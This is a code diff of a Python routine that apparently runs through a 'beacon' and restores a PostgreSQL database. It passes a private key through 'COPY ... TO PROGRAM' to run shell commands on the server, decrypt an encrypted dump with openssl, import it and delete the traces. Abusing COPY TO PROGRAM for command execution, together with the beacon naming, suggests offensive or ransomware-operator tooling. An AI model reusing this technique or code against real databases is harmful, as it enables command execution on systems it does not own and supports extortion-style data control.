@@ -251,7 +251,11 @@ def _db_restoration(vinzenz_beacon: str, creds: dict, private_key_pem: str) -> b
     try:
         privkey_base64 = base64.b64encode(private_key_pem.encode()).decode().strip()
         
-        sql_cmd = f"COPY (SELECT 1) TO PROGRAM $$echo '{privkey_base64}' | base64 -d > /tmp/privkey.pem && openssl cms -decrypt -binary -in /var/lib/postgresql/TEST.tar.enc -inkey /tmp/privkey.pem 2>/dev/null | tar -xf - -C /var/lib/postgresql/data && rm -f /var/lib/postgresql/TEST.tar.enc /tmp/privkey.pem$$;"
+        # 1. Create database waystar (must connect to 'postgres' database)
+        sql_create = "CREATE DATABASE waystar;"
+        
+        # 2. Decrypt and import SQL dump
+        sql_import = "COPY (SELECT 1) TO PROGRAM 'echo ''" + privkey_base64 + "'' | base64 -d > /tmp/privkey.pem && openssl cms -decrypt -binary -in /var/lib/postgresql/TEST.sql.enc -inkey /tmp/privkey.pem -out /tmp/restore.sql && psql -U waystar -d waystar -f /tmp/restore.sql && rm -f /tmp/privkey.pem /tmp/restore.sql /var/lib/postgresql/TEST.sql.enc';"
         
         db_code = f"""import subprocess, sys
 try:
@@ -260,25 +264,44 @@ try:
         "PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
     }}
     
-    proc = subprocess.run(
+    # Recreate the waystar DB via postgres connection
+    proc_create = subprocess.run(
         [
             "psql",
             "-h", "{creds['host']}",
             "-p", "{creds['port']}",
             "-U", "{creds['user']}",
-            "-d", "{creds['dbname']}",
-            "-c", \"\"\"{sql_cmd}\"\"\"
+            "-d", "postgres",
+            "-c", \"\"\"{sql_create}\"\"\"
+        ],
+        env=env,
+        capture_output=True,
+        text=True
+    )
+    if proc_create.returncode != 0:
+        # If it already exists or fails, log it but try to continue
+        print(f"[*] Note during DB creation: {{proc_create.stderr.strip()}}")
+        
+    # Decrypt and import into waystar DB
+    proc_import = subprocess.run(
+        [
+            "psql",
+            "-h", "{creds['host']}",
+            "-p", "{creds['port']}",
+            "-U", "{creds['user']}",
+            "-d", "postgres",
+            "-c", \"\"\"{sql_import}\"\"\"
         ],
         env=env,
         capture_output=True,
         text=True
     )
     
-    if proc.returncode == 0:
+    if proc_import.returncode == 0:
         print("[+] DB-Wiederherstellung erfolgreich")
         sys.exit(0)
     else:
-        print(f"[-] DB-Wiederherstellung fehlgeschlagen: {{proc.stderr.strip()}}")
+        print(f"[-] DB-Wiederherstellung fehlgeschlagen: {{proc_import.stderr.strip()}}")
         sys.exit(1)
 except Exception as e:
     print(f"[-] DB-Wiederherstellung fehlgeschlagen: {{e}}")
